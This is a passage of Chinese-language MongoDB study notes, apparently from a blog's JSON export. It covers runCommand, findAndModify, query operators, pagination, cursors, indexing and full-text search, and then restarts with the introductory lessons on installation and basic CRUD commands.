是数据库运行命令的<code>执行器</code>,执行命令<code>首选</code>就要使用它,因为它在<code>Shell</code>和<code>驱动程序</code>间提供了一致的接口。（几乎操作数据库的所有操作,都可以使用<code>runCommand</code>来执行）现在我们试着用<code>runCommand</code>来修改数据库,看看结果和直接用<code>db.collections.update</code>有什么<code>不同</code>。</p>\n<blockquote>\n<p>db.workmate.update({sex:1},{$set:{money:1000}},false,true)<br>var resultMessage=db.runCommand({getLastError:1})<br>printjson(resultMessage);</p>\n</blockquote>\n<p>   上边代码 修改所有男士 每人增加1000元钱(money),然后用<code>db.runCommand()</code>执行,可看到执行结果在控制台返回。<br>    {<br>      “connectionId” : 1,<br>      “updatedExisting” : true,<br>      “n” : 2,<br>      “syncMillis” : 0,<br>      “writtenTo” : null,<br>      “err” : null,<br>      “ok” : 1<br>    }<br>    <code>false</code>：第一句末尾的false是upsert的简写,代表没有此条数据时不增加;<br>    <code>true</code>：true是multi的简写,代表修改所有,这两个前边已学过。<br>    <code>getLastError:1</code> :表示返回功能错误,这里的参数很多,如果有兴趣请自行查找学习,这里不作过多介绍。<br>    <code>printjson</code>：表示以json对象的格式输出到控制台。<br>    <code>db.listCommands( )</code>:查看所有的Commad命令, 内容很多, 本课程只讲解<code>工作中经常使用</code>的内容。</p>\n<p>   比如我们要查看是否和数据库链接成功了,就可以使用Command命令。<br>   <code>db.runCommand({ping:1})</code><br>   返回<code>ok:1</code>就代表链接正常。</p>\n<p>  <strong>findAndModify</strong><br>   从名字看,<code>findAndModify</code>是<code>查找并修改</code>的意思。配置它可以在修改后给我们返回修改的结果。看下面代码：</p>\n<blockquote>\n<p>var myModify={<br> findAndModify:”workmate”,<br> query:{name:’JSPang’},<br> update:{$set:{age:18}},<br> new:true    //更新完成,需要查看结果,如果为false不进行查看结果<br>}<br>var ResultMessage=db.runCommand(myModify);</p>\n<p>printjson(ResultMessage)<br>   <code>findAndModify</code>的<code>性能</code>是不如<code>db.collections.update</code>的性能好,但实际工作中都使用它,毕竟要<code>商用程序</code>安全性还是比较重要的。<br>   <code>findAndModify属性值</code>:<br>    <code>query</code>:需要查询的条件/文档<br>    <code>sort</code>: 排序<br>    <code>remove</code>:[boolean]是否删除查找到的文档,值填写true,可以删除。<br>    <code>new</code>:[boolean]返回更新前的文档还是更新后的文档。<br>    <code>fields</code>:需要返回的字段<br>    <code>upsert</code>:没有这个值是否增加。<br>   <strong>总结</strong>：这节讲了一些跟<code>安全有关的操作</code>,但这<code>不是全部</code>,我们随着课程的深入还会继续学习更多的知识。工作中尽量使用<code>findAndModify</code>来进行更新数据,这样会更安全和直观,这点性能的损失是值得的。</p>\n</blockquote>\n<h2 id=\"第10节：查询：find的不等修饰符-简单查找-quot-x-x-quot-转字符串-筛选字段-第二对象参数-boolean-0-1-不等修饰符\"><a href=\"#第10节：查询：find的不等修饰符-简单查找-quot-x-x-quot-转字符串-筛选字段-第二对象参数-boolean-0-1-不等修饰符\" class=\"headerlink\" title=\"第10节：查询：find的不等修饰符(简单查找(&quot;x.x&quot;)转字符串 筛选字段(第二对象参数 boolean || 0/1) 不等修饰符)\"></a>第10节：查询：find的不等修饰符(<code>简单查找(&quot;x.x&quot;)转字符串</code> <code>筛选字段(第二对象参数 boolean || 0/1)</code> <code>不等修饰符</code>)</h2><p>  <code>MongoDB</code>的<code>查找操作</code> 分几节课来讲,因为内容比较多, <code>开发中</code> 查找 是应用最多的操作,几乎每个模块都会用到,所以<code>查找部分</code>将是本套课的<code>重中之重</code>。这节课我们先来看看简单的查询条件,也了解一下find基础用法。<br>  如果你以前操作过<code>关系型数据库</code>比如<code>MySql</code> 你会对&gt;(大于),&lt;(小于),=(等于)这些东西很熟悉,但是<code>非关系型数据库</code>不能直接使用这些符号,稍有区别。<br>  <strong>构造数据</strong><br>   我们需要构造更多的数据到集合中,这样我们才能很好的讲解查询条件,下面代码你可以直接复制进行添加。当然你也可以自己随意加一些数据到集合中,只要方便我们学习就可以了。<br>   “D:\\工具\\工作学习\\monggoShell\\demo10.js”</p>\n<p>  <strong>简单查找</strong><br>   比如 现在要查找数据中 技能一 会HTML+CSS 的所有人。直接进行查找加条件就可以。</p>\n<blockquote>\n<p>db.workmate.find({“skill.skillOne”:”HTML+CSS”})<br>   这时不能使用load来载入,以后会给大家讲使用方法,先用比较笨的方法,使用粘贴复制的方法 在命令行执行。</p>\n</blockquote>\n<p>  <strong>筛选字段</strong><br>   <code>返回数据项</code>太多,太乱,有时 程序并不需要 这么多选项。比如 只需要<code>姓名</code>和<code>技能</code>就可以了。这时候需要写第二个参数,看以下代码。<br>   db.workmate.find(<br>      {“skill.skillOne”:”HTML+CSS”},<br>      {name:true,”skill.skillOne”:true}<br>   )<br>   终端中看到如下结果：<br>    略……<br>   细心的小伙伴会发现还不够完美,多了一个<code>ID字段</code>,这个也不是我们想要的,这时候只要把<code>_id:false</code>就可以了。当然这里的<code>false</code>和<code>true</code>,<strong>也可以用<code>0</code>和<code>1</code>表示。</strong><br>   db.workmate.find(<br>     {“skill.skillOne”:”HTML+CSS”},<br>     {name:1,”skill.skillOne”:1,_id:0}<br>   )<br>   <strong>不过</strong>这些查找操作,都是在作<code>等于</code>的阶段,但是不光只有等于查询,我们需要更多的查询条件。</p>\n<p>  <strong>不等修饰符</strong></p>\n<ul>\n<li>小于($lt):英文全称<code>less-than</code></li>\n<li>小于等于($lte)：英文全称<code>less-than-equal</code></li>\n<li>大于($gt):英文全称<code>greater-than</code></li>\n<li>大于等于($gte):英文全称<code>greater-than-equal</code></li>\n<li><p>不等于($ne):英文全称<code>not-equal</code><br>现在要查找,公司内年龄<code>小于30</code>&amp;<code>大于25岁</code>的人员。看下面的代码。<br>db.workmate.find(<br>{age:{$lte:30,$gte:25}},<br>{name:true,age:true,”skill.skillOne”:true,_id:false}<br>)</p>\n<p><strong>日期查找</strong><br>MongoDB也提供了方便的日期查找方法,现在我们要查找注册日期大于2018年1月10日的数据,我们可以这样写代码。<br>“D:\\工具\\工作学习\\monggoShell\\batch10.js”<br>先声明一个日期变量,然后使用<code>大于符</code>($gt)进行筛选。</p>\n<p><strong>总结</strong>：这节课内容并不多,但如果你是个<code>DBA</code>(数据库管理员) 查找命令工作中每天都会用到,所以这节课的内容练习是必须的,如果你懒得动手,那接下来的课程你可能无法学会。</p>\n</li>\n</ul>\n<h2 id=\"第11节：查询：find的多条件查询-in-nin-有-无-or-and-not-或-与-非\"><a href=\"#第11节：查询：find的多条件查询-in-nin-有-无-or-and-not-或-与-非\" class=\"headerlink\" title=\"第11节：查询：find的多条件查询($in/$nin(有/无) $or / $and / $not(或/与/非))\"></a>第11节：查询：find的多条件查询(<code>$in/$nin</code>(有/无) <code>$or / $and / $not</code>(或/与/非))</h2><p>  很多时候我们需要查询的值<code>不只是有一个简单的条件</code>,比如我们现在要查询一下同事中是<code>33岁</code>和<code>25岁</code>的,还比如我们要查询同事中<code>大于30岁</code>并且<code>会PHP技能</code>的。MongoDB在这方面也支持的很好,我们来学习一下。</p>\n<p>  <strong>$in修饰符</strong><br>   <code>in修饰符</code>可以轻松解决<code>一键多值</code>的查询情况。<br>   就如上面我们讲的例子,现在要查询同事中年龄是25岁和33岁的信息。</p>\n<blockquote>\n<p>db.workmate.find(<br>  {age:{$in:[25,33]}},<br>  {name:1,”skill.skillOne”:1,age:1,_id:0}<br>)<br>   <code>$in</code>相对的修饰符是<code>$nin</code>,就是查询<code>除了$in条件</code>以外的值,小伙伴们可以自己进行练习一下,这里我就不作过多的演示了。</p>\n</blockquote>\n<p>  <strong>$or修饰符</strong><br>   <code>$or修饰符</code>用来查询<code>多个键值</code>的情况,比如查询同事中大于30岁或者会做PHP的信息。<br>   <code>$or修饰符</code>与<code>$in/$nin</code>主要区别 <code>$or</code>修饰符是两个Key值 <code>$in/$nin</code>修饰符是一个Key值 需比较记忆。</p>\n<p>  <strong>总结</strong>：这节知识比较简单,但要<code>区分记忆</code>,很<code>容易搞混</code>。幸运的是这里已经为你准备好学习笔记。当你忘记的时候过来看看吧。</p>\n<h2 id=\"第12节：查询：find的数组查询-all-in-size-slice-显示选项\"><a href=\"#第12节：查询：find的数组查询-all-in-size-slice-显示选项\" class=\"headerlink\" title=\"第12节：查询：find的数组查询($all $in $size $slice(显示选项))\"></a>第12节：查询：find的数组查询(<code>$all</code> <code>$in</code> <code>$size</code> <code>$slice(显示选项)</code>)</h2><p>  这节主要学习数组的查询,在学习update时就花了重墨去讲数组的操作,可见数组的操作在MongoDB中很受重视,因为稍微大型一点的项目,设计的数据集合都复杂一些,都会涉及数组的操作。</p>\n<p>  <strong>完善数据</strong><br>   以前我们的<code>workmate集合</code>对数组涉及还很少,现在在数据中加入了<code>兴趣（interest）</code>,并且给每个人加入了一些兴趣,比如有写代码,做饭,看电影…<br>   当然这些数据你可以自己随意构建,但是如果你不想自己费事费脑,这里也为你准备好了数据,你只要把以前的表删除（drop）掉,重新载入(load)就可以了。</p>\n<p>  <strong>基本数组查询</strong><br>   比如现在我们知道了一个人的爱好是’画画’,’聚会’,’看电影’,但我们不知道是谁,这时候我们就可以使用最简单的数组查询（实际工作中,这种情况基本不常用,所以这种查询只作知识点储备就可以了）。</p>\n<p>   在终端中运行后,我们得到了数据。这时候我们说,想查出看兴趣中有看电影的员工信息。按照正常逻辑,应该使用下面的代码。</p>\n<p>  <strong>$all-数组<code>多项</code>查询(类似 &amp;&amp;)</strong><br>   现在我们的条件升级了,要查询出既喜欢<code>看电影</code>又<code>看书</code>的人员信息,也就是对数组中的对象进行查询,这时候要用到一个新的查询修饰符$all。看下面的例子：</p>\n<p>  <strong>$in-数组的<code>或者</code>查询</strong><br>   <code>$all</code>修饰符,需要<code>满足所有条件</code>; <code>$in</code>主要<code>满足数组中任意的一项</code>就可以被查出来(有时候会跟<code>$or</code>弄混)。比如现在要查询爱好中有看电影的或者看书的员工信息。</p>\n<p>  <strong>$size-数组<code>个数</code>查询</strong></p>\n<p>  <strong>$slice-<code>显示选项</code></strong><br>    展示数据时的判断条件,显示前几项或后几项。<br>    db.workmate.find(<br>      {},<br>      {name:1,interest:{$slice:2},age:1,_id:0}<br>    )</p>\n<p>  <strong>总结</strong>：如果你只看视频一定学不会,程序这东西必须要动手练习,我在所有的视频中都反复强调,目的没有别的就是想让你们真的学会,并应用到工作中去。</p>\n<h2 id=\"第13节：查询：find的参数使用方法-find参数-query-fields-limit-skip-sort-分页Demo-where\"><a href=\"#第13节：查询：find的参数使用方法-find参数-query-fields-limit-skip-sort-分页Demo-where\" class=\"headerlink\" title=\"第13节：查询：find的参数使用方法(find参数[query,fields,limit,skip,sort] 分页Demo $where)\"></a>第13节：查询：find的参数使用方法(<code>find参数[query,fields,limit,skip,sort]</code> <code>分页Demo</code> <code>$where</code>)</h2><p>  前边已讲3节查询,都是在操作<code>find</code>方法的<code>第一个参数(query)</code>和<code>第二个参数(fields)</code>。<code>find</code>还有几个常用的参数,这些参数多用在<code>分页</code>和<code>排序</code>上。这节我们就把这些常用的选项说一说,理解后我们演示一个分页的效果。</p>\n<p>  <strong>find参数</strong><br>    <code>query</code>：这个就是查询条件,<code>MongoDB默认</code>的第一个参数。<br>    <code>fields</code>：（返回内容）查询出来后显示的结果样式,可以用<code>true(1)</code>和<code>false(0)</code>控制是否显示。<br>    <code>limit</code>：返回的数量,后边跟<code>数字(number)</code>,控制<code>每次查询返回</code>的结果数量。<br>    <code>skip</code>:跳过多少个显示,和<code>limit</code>结合可以实现分页。(number)<br>    <code>sort</code>：排序方式,从小到大排序使用<code>1</code>,从大到小排序使用<code>-1</code>。</p>\n<p>  <strong>分页Demo</strong></p>\n<blockquote>\n<p>db.workmate.find({},{name:true,age:true,_id:false}).limit(0).skip(2).sort({age:1});</p>\n</blockquote>\n<p>  <strong>$where修饰符</strong><br>   db.workmate.find(<br>     {$where:”this.age&gt;30”},<br>     {name:true,age:true,_id:false}<br>   )<br>   这里的<code>this</code>指向的是<code>workmate(查询集合)</code>本身。这样我们就可以在程序中随意调用。虽然强大和灵活,但是这种查询对于<code>数据库压力</code>和<code>安全性</code>都会变重,所以在工作中<code>尽量减少</code>$where修饰符的使用。</p>\n<h2 id=\"第14节：查询：find如何在js文本中使用-hasNext-forEach-基础部分完结\"><a href=\"#第14节：查询：find如何在js文本中使用-hasNext-forEach-基础部分完结\" class=\"headerlink\" title=\"第14节：查询：find如何在js文本中使用(hasNext forEach)[基础部分完结]\"></a>第14节：查询：find如何在js文本中使用(<code>hasNext</code> <code>forEach</code>)[基础部分完结]</h2><p>  前边使用<code>find</code>都是<code>JS</code>在文本中写完,然后复制到终端中执行,这样非常麻烦。在讲的过程中已经有很多小伙伴在问我如何像写<code>update</code>语句一样,在文本中直接运行。这节课我们就学习一下如何直接在文本中执行。</p>\n<p>  <strong>hasNext循环结果</strong><br>   想在文本中执行我们的<code>find</code>语句要用到<code>游标</code>和<code>循环</code>的操作,先看一下代码,代码中我已经对每一句进行了注释。</p>\n<blockquote>\n<p>var db = connect(“company”)  //进行链接对应的集合collections<br>var result = db.workmate.find() //声明变量result,并把查询结果赋值给result<br>//利用游标的hasNext()进行循环输出结果。<br>while(result.hasNext()){<br>    printjson(result.next())  //用json格式打印结果<br>}<br>   写完后,现在你只需要在终端中进行<code>load()</code>就可以执行了,再也不用麻烦的复制粘贴了。</p>\n</blockquote>\n<p>  <strong>forEach循环</strong><br>   利用<code>hasNext循环</code>结果,需要借助<code>while</code>的帮助,MongoDB也为我们提供了<code>forEach循环</code>,现在修改上边的代码,使用forEach循环来输出结果。</p>\n<blockquote>\n<p>var db = connect(“company”)  //进行链接对应的集合collections<br>var result = db.workmate.find() //声明变量result,并把查询结果赋值给result<br>//利用游标的hasNext()进行循环输出结果。<br>result.forEach(function(result){<br>    printjson(result)<br>})<br>   <code>作者</code>觉的<code>forEach循环</code>更为<code>优雅</code>。这两种方法都是非常不错的,凭借自己爱好进行选择吧。</p>\n</blockquote>\n<p>  <strong>总结</strong>：那我们MongoDB的<code>基础部分</code>就全部讲完了,我们学会了它的<code>增、删、改、查</code>,你也可以使用MongoDB进行一些操作了。需要注意的是,只是这篇文章的完结,下篇文章我们进行讲解MongoDB,开始讲解MongoDB的<code>索引</code>。</p>\n<h2 id=\"第15节：索引-构造百万级数据-db-randomInfo-stats\"><a href=\"#第15节：索引-构造百万级数据-db-randomInfo-stats\" class=\"headerlink\" title=\"第15节：索引:构造百万级数据(db.randomInfo.stats())\"></a>第15节：索引:构造百万级数据(<code>db.randomInfo.stats()</code>)</h2><p>  索引的<code>性能</code>体现必须要有<code>大量数据</code>才能看出来,你说你有10条20条数据,这是根本看不出来效果的,这节课就通过随机数的方法,创造出一个百万级数据的数据库出来。(随机插入数据,见mongoshell demo15.js)<br>  <strong>PS</strong>:<code>索引</code>是什么？把数据当成一个字典,<code>索引</code>即<code>目录</code>。消耗<code>内存</code>和<code>硬盘</code>。</p>\n<p>  <strong>制作随机数方法</strong></p>\n<p>  <strong>制作随机用户名</strong></p>\n<p>  插入完成后,我们可以使用<code>db.randomInfo.stats()</code>命令查看数据中的数据条数。</p>\n<p>  <strong>总结</strong>:这节课主要是为讲解MongoDB的<code>索引</code>作准备,我们用<code>随机数</code>的方法构建了一个<code>百万级</code>的数据表,如果你有兴趣继续往下学习 练习,这节课必须动手做一下。以后这篇文章的学习全是基于这个代码。</p>\n<h2 id=\"第16节：索引：索引入门-ensureIndex-getIndexes\"><a href=\"#第16节：索引：索引入门-ensureIndex-getIndexes\" class=\"headerlink\" title=\"第16节：索引：索引入门(ensureIndex getIndexes)\"></a>第16节：索引：索引入门(<code>ensureIndex</code> <code>getIndexes</code>)</h2><p>  集合中已建立 200万条数据,可以进行<code>索引</code>的操作了。我们先来建立一个索引,然后看看它的<code>查询性能</code>到底提升了多少倍。这节课的内容不会很难,主要掌握<code>索引的建立方法</code>即可。</p>\n<h3 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h3><pre><code>db.randomInfo.ensureIndex({username:1})\n</code></pre><h3 id=\"查看现有索引\"><a href=\"#查看现有索引\" class=\"headerlink\" title=\"查看现有索引\"></a>查看现有索引</h3><pre><code>db.randomInfo.getIndexes()   \n</code></pre><h2 id=\"第17节：索引：复合索引-复合索引的坑-ensureIndex-hint\"><a href=\"#第17节：索引：复合索引-复合索引的坑-ensureIndex-hint\" class=\"headerlink\" title=\"第17节：索引：复合索引(复合索引的坑 ensureIndex hint)\"></a>第17节：索引：复合索引(<code>复合索引的坑</code> <code>ensureIndex</code> <code>hint</code>)</h2><p>什么样的数据使用索引会变慢？<br><code>复合索引</code>的<code>使用</code>和<code>语法</code><br>通过这节 需要对<code>索引</code>使用的<code>时机</code>有所了解，避免画蛇添足，产生不必的麻烦。</p>\n<h3 id=\"索引中的小坑\"><a href=\"#索引中的小坑\" class=\"headerlink\" title=\"索引中的小坑\"></a>索引中的小坑</h3><ul>\n<li>数据<code>不超万条</code>时，不需要使用索引。性能的提升并不明显，大大<code>增加了内存、硬盘 消耗</code>。</li>\n<li>查询数据<code>超过表数据量30%</code>时，不要使用索引字段查询。实际证明会<code>比不使用索引更慢</code>，因为它<code>大量检索</code>了<code>索引表</code>和我们<code>原表</code>。</li>\n<li><code>数字索引</code>，要<code>比字符串索引快</code>的多，在百万级甚至千万级数据量面前，使用数字索引是个明确的选择。</li>\n<li>把你经常查询的数据做成一个<code>内嵌数据</code>（对象型的数据），然后集体进行索引。</li>\n</ul>\n<h3 id=\"复合索引-ensureIndex\"><a href=\"#复合索引-ensureIndex\" class=\"headerlink\" title=\"复合索引(ensureIndex)\"></a>复合索引(<code>ensureIndex</code>)</h3><p><strong>复合索引就是两条以上的索引。</strong>上节课我们已经把<code>username</code>字段建立了索引，我们现在把<code>randNum0</code>，这个字段也设置成索引。<br>    db.randomInfo.ensureIndex({randNum0:1})</p>\n<p>建立好后，再用<code>查询索引状态</code>命令进行查询。<br>    db.randomInfo.getIndexes()</p>\n<h3 id=\"两个索引同时查询\"><a href=\"#两个索引同时查询\" class=\"headerlink\" title=\"两个索引同时查询\"></a>两个索引同时查询</h3><pre><code>var db = connect(&apos;company&apos;);\nvar rs= db.randomInfo.find({username:&apos;7xwb8y3&apos;,randNum0:565509});\n</code></pre><p>从性能上看并没有什么特殊的变化，查询时间还是在4ms左右。MongoDB的<code>复合查询</code>是按照我们的<code>索引顺序</code>进行查询的。就是我们用<code>db.randomInfo.getIndexes()</code>查询出的数组。</p>\n<h3 id=\"指定索引查询-hint\"><a href=\"#指定索引查询-hint\" class=\"headerlink\" title=\"指定索引查询(hint)\"></a>指定索引查询(<code>hint</code>)</h3><p><code>数字</code>的索引要比<code>字符串</code>的索引<code>快</code>，这就需要一个方法来打破索引表的查询顺序，用我们自己<code>指定的索引</code>优先查询，这个方法就是<code>hint()</code>.</p>\n<pre><code>var rs= db.randomInfo.find({username:&apos;7xwb8y3&apos;,randNum0:565509}).hint({randNum0:1});\n</code></pre><p>由于<code>数据量</code>和<code>复杂成都</code>一般，所以没有明显性能提升。工作中遇到<code>大数据</code>，会得到<code>好的效果</code>。</p>\n<h3 id=\"删除索引-dropIndex\"><a href=\"#删除索引-dropIndex\" class=\"headerlink\" title=\"删除索引(dropIndex)\"></a>删除索引(<code>dropIndex</code>)</h3><p>当索引<code>性能不佳</code>或<code>起不到作用</code>时，我们需要删除索引，删除索引的命令是<code>dropIndex()</code>.</p>\n<pre><code>db.randomInfo.dropIndex(&apos;randNum0_1&apos;); // 索引的唯一ID\n</code></pre><p>这里需要<code>注意</code>的是删除时填写的值，并<code>不是 字段名称(key)</code>，<code>而是 索引查询表(getIndexes())中 name值</code>。</p>\n<h3 id=\"总结：这节主要内容-操作索引，包括复合索引-建立-删除。使用-索引的-窍门。\"><a href=\"#总结：这节主要内容-操作索引，包括复合索引-建立-删除。使用-索引的-窍门。\" class=\"headerlink\" title=\"总结：这节主要内容 操作索引，包括复合索引 建立/删除。使用 索引的 窍门。\"></a>总结：这节主要内容 <code>操作索引</code>，包括<code>复合索引 建立/删除</code>。使用 索引的 <code>窍门</code>。</h3><h2 id=\"第18节：索引：全文索引-text-search\"><a href=\"#第18节：索引：全文索引-text-search\" class=\"headerlink\" title=\"第18节：索引：全文索引($text $search)\"></a>第18节：索引：全文索引(<code>$text</code> <code>$search</code>)</h2><p>有时候需要在<code>大篇幅文章</code>中<code>搜索关键词</code>，比如文章每篇都在<code>万字以上</code>，这时候想<code>搜索关键字</code>是非常<code>不容易</code>的，<code>MongoDB</code>为提供了<code>全文索引</code>。</p>\n<h3 id=\"准备工作-建立集合-插入-数据\"><a href=\"#准备工作-建立集合-插入-数据\" class=\"headerlink\" title=\"准备工作(建立集合 插入 数据)\"></a>准备工作(建立集合 插入 数据)</h3><p>先建立<code>集合(collections)</code> —— <code>info</code>，然后<code>插入</code> 小段文章，<code>作用</code>就是为 建立 全文索引 提供数据，不再建立 百万级数据，只看效果。</p>\n<pre><code>db.info.insert({contextInfo:&quot;I am a programmer, I love life, love family. Every day after work, I write a diary.&quot;})\ndb.info.insert({contextInfo:&quot;I am a programmer, I love PlayGame, love drink. Every day after work, I playGame and drink.&quot;})\n</code></pre><p>再次强调 只是练习需要，实际工作中 简单数据 没必要 建立 全文索引。</p>\n<h3 id=\"建立全文索引-ensureIndex\"><a href=\"#建立全文索引-ensureIndex\" class=\"headerlink\" title=\"建立全文索引(ensureIndex)\"></a>建立全文索引(<code>ensureIndex</code>)</h3><pre><code>db.info.ensureIndex({contextInfo:&apos;text&apos;})\n</code></pre><p>需要注意的是这里使用<code>text</code>关键词来<code>代表全文索引</code>，这里不再 <code>建立数据模型</code>。</p>\n<h3 id=\"全文索引查找-text-search\"><a href=\"#全文索引查找-text-search\" class=\"headerlink\" title=\"全文索引查找($text $search)\"></a>全文索引查找(<code>$text</code> <code>$search</code>)</h3><p>建立好了全文索引就可以查找了，查找时需要两个关键修饰符:</p>\n<ul>\n<li>$text:表示要在全文索引中查东西。</li>\n<li><p>$search:后边跟查找的内容。</p>\n<p>  db.info.find({$text:{$search:”programmer”}})</p>\n</li>\n</ul>\n<h3 id=\"多词查找-单词关系为-或-排除关键词\"><a href=\"#多词查找-单词关系为-或-排除关键词\" class=\"headerlink\" title=\"多词查找(单词关系为 或||, 排除关键词-)\"></a>多词查找(单词关系为 <code>或||</code>, 排除关键词<code>-</code>)</h3><p><code>全文索引</code>是支持<code>多词查找</code>的，比如我们希望查找数据中有programmer，family，diary，drink的数据(单词关系属于 <code>或||</code> 的关系)，所以两条数据都会出现。</p>\n<pre><code>db.info.find({$text:{$search:&quot;programmer family diary drink&quot;}})\n</code></pre><p>如果不希望 查找带有<code>drink</code>这个单词的记录，我们可以使用<code>-</code>减号来排除。</p>\n<pre><code>db.info.find({$text:{$search:&quot;programmer family diary -drink&quot;}})\n</code></pre><h3 id=\"转义符\"><a href=\"#转义符\" class=\"headerlink\" title=\"转义符()\"></a>转义符()</h3><p><code>全文搜索</code>中<code>支持转义符</code>，比如 想 搜索的是 两个词(<code>love PlayGame</code>和<code>drink</code>)，这时候需要使用<code>\\</code>反斜杠来转意。</p>\n<pre><code>db.info.find({$text:{$search:&quot;\\&quot;love PlayGame\\&quot; drink&quot;}})\n</code></pre><h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>全文索引</code>在工作中比较常用,比如<code>博客文章</code>搜索、<code>长文件</code>的<code>关键词</code>搜索,都需要使用全文索引。</p>\n<p>## </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"MongoDB学习笔记-JS胖\"><a href=\"#MongoDB学习笔记-JS胖\" class=\"headerlink\" title=\"MongoDB学习笔记(JS胖)\"></a><a href=\"http://jspang.com/2017/12/16/mongdb/\" target=\"_blank\" rel=\"noopener\">MongoDB学习笔记(JS胖)</a></h1><p>(2018年1月26日 13:53:11)</p>\n<h2 id=\"第01节：认识和安装MongoDB\"><a href=\"#第01节：认识和安装MongoDB\" class=\"headerlink\" title=\"第01节：认识和安装MongoDB\"></a>第01节：认识和安装MongoDB</h2><blockquote>\n<p>MongoDB是<code>非关系型数据库</code><br>   关系数据库,是建立在关系模型基础上的数据库。<br>   安装步骤：<br>    1.去官网下载MongoDB,<a href=\"https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。\" target=\"_blank\" rel=\"noopener\">https://www.mongodb.com/,在网站中找到Download按钮。下载会有点忙,国外的服务器,你懂的。</a><br>    2.下载后进行安装,安装没什么难度,但是对于新手建议选择默认安装,而不选择自己配置。等我们完全熟悉后再定制式配置。<br>    3.安装时如果有安全软件,会报一些拦截,一律允许就好,不允许会安装失败的。<br>    4.安装完成后,需要配置“环境变量”,目的是再命令行中直接使用,而不需要输入很长的路径了。（此步骤观看视频）</p>\n</blockquote>\n<p>   查看存在数据库命令：<code>show dbs</code><br>   查看数据库版本命令：<code>db.version()</code> </p>\n<h2 id=\"第02节：Mongo基本命令-1-show-dbs-use-xxdb-show-collections-db-MongoDB的存储结构\"><a href=\"#第02节：Mongo基本命令-1-show-dbs-use-xxdb-show-collections-db-MongoDB的存储结构\" class=\"headerlink\" title=\"第02节：Mongo基本命令-1(show dbs use xxdb show collections db MongoDB的存储结构)\"></a>第02节：Mongo基本命令-1(<code>show dbs</code> <code>use xxdb</code> <code>show collections</code> <code>db</code> <code>MongoDB的存储结构</code>)</h2><p>   接下来的几节直接上手<code>Mongo命令</code>,<code>MSSQL</code>和<code>MYsql</code>用的都是<code>Sql命令</code>。<br>   MongoDB的操作命令就是前端最熟悉的JavaScript命令。<br>   先来一个常用的赋值和输出命令,熟悉一下。（操作前你需要打开Mongo服务器和链接到服务器-也就是我们上节讲的<code>mongod</code>命令和<code>mongo</code>命令）在命令行中输入以下代码。<br>   需要注意的是这里的输出不再使用<code>console.log</code>(‘巴拉巴拉’),而是使用<code>print</code>(‘巴拉巴拉’),这个稍有区别。</p>\n<p>   <strong>MongoDB的存储结构</strong><br>    以前我们的关系型数据库的数据结构都是顶层是库,库下面是表,表下面是数据。但是MongoDB有所不同,库下面是集合,集合下面是文件,可以看下面这张图进行了解一下。</p>\n<pre><code>**存储解构不同**\n  关系型数据库\n    --数据库\n    --数据表\n    --数据行\n  非关系型数据库(MongoDB)\n    --数据库\n    --集合\n    --文件\n\n 在学习中我们可以对比记忆,这样才能更好的了解这些名词,其实数据表就是集合,数据行就是文件,当然这只是为了记忆,实质还是有区别的。\n</code></pre><p>   <strong>基础Shell命令</strong><br>    了解<code>存储结构</code>后,就可学习基础<code>Shell</code>命令,因 命令 较基础,以 列表形式展现,具体使用方法可到视频观看。<br>    <code>show dbs</code>:显示已有数据库. 如果你刚安装好,会默认有local、admin(config),这是MongoDB的默认数据库,我们在新建库时是不允许起这些名称的。<br>    <code>use admin</code>： 进入数据,也可以理解成为使用数据库。成功会显示：<code>switched to db admin</code>。<br>    <code>show collections</code>: 显示数据库中的<code>集合</code>（关系型中叫<code>表</code>,我们要逐渐熟悉）。<br>    <code>db</code>:显示当前位置. 也就是你当前使用的数据库名称,这个命令算是最常用的,因为你在作任何操作的时候都要先查看一下自己所在的库,以免造成操作错误。</p>\n<p>   <code>总结</code>：这节 学习已经 进入 <code>MongoDB</code> 世界,使用 比较简单,都是 基本命令, 敲回车就可使用,但还要多进行 练习。<code>重点</code> 要转变 以前<code>数据库存储结构的思想</code>,<code>掌握MongoDB的存储结构</code>。 </p>\n<h2 id=\"第03节：Mongo基本命令-2-“基本数据增删改查“-use-db-insert-find-findOne-update-remove-drop-dropDatabase-count\"><a href=\"#第03节：Mongo基本命令-2-“基本数据增删改查“-use-db-insert-find-findOne-update-remove-drop-dropDatabase-count\" class=\"headerlink\" title=\"第03节：Mongo基本命令-2(“基本数据增删改查“ use db insert find findOne update remove drop dropDatabase count)\"></a>第03节：Mongo基本命令-2(“基本数据<code>增删改查</code>“ <code>use db</code> <code>insert</code> <code>find</code> <code>findOne</code> <code>update</code> <code>remove</code> <code>drop</code> <code>dropDatabase</code> <code>count</code>)</h2><p>   学会基本的 数据 <code>增删改查</code><br>   数据操作基础命令：<br>    <code>use db</code>(建立数据库)：use不仅可以进入一个数据库,如果你敲入的库不存在,它还可以帮你建立一个库。但是在没有集合前,它还是默认为空。<br>    <code>db.集合.insert({&quot;&quot;:&quot;&quot;,&quot;&quot;:&quot;&quot;})</code>:新建数据集合和插入文件（数据）,<strong>当集合没有时,这时候就可以新建一个集合,并向里边插入数据。</strong> <code>Demo：db.user.insert({“name”:”jspang”})</code><br>    <code>db.集合.find( )</code>:查询所有数据,这条命令会列出集合下的所有数据,可以看到MongoDB是自动给我们加入了索引值的。<code>Demo：db.user.find()</code><br>    <code>db.集合.findOne( )</code>:查询第一个文件数据,这里需要注意的,所有MongoDB的组合单词都使用首字母小写的驼峰式写法。<br>    <code>db.集合.update({查询},{修改})</code>:修改文件数据,第一个是查询条件,第二个是要修改成的值。这里注意的是可以多加文件数据项的,比如下面的例子。<br>    <code>db.集合.remove(条件)</code>：删除文件数据,注意的是要跟一个条件。<code>Demo</code>:<code>db.user.remove({“name”:”jspang”})</code><br>    <strong>以下基本不用</strong><br>    <code>db.集合.drop( )</code>:删除整个集合,这个在实际工作中一定要谨慎使用,如果是程序,一定要二次确认。<br>    <code>db.dropDatabase( )</code>:删除整个数据库,在删除库时,一定要先进入数据库,然后再删除。实际工作中这个基本不用,实际工作可定需要保留数据和痕迹的。<br>    <code>db.collections.count({rule})</code></p>\n<h2 id=\"第04节：用js文件写mongo命令-var-db-connect-quot-dbName-quot\"><a href=\"#第04节：用js文件写mongo命令-var-db-connect-quot-dbName-quot\" class=\"headerlink\" title=\"第04节：用js文件写mongo命令(var db = connect(&quot;dbName&quot;) 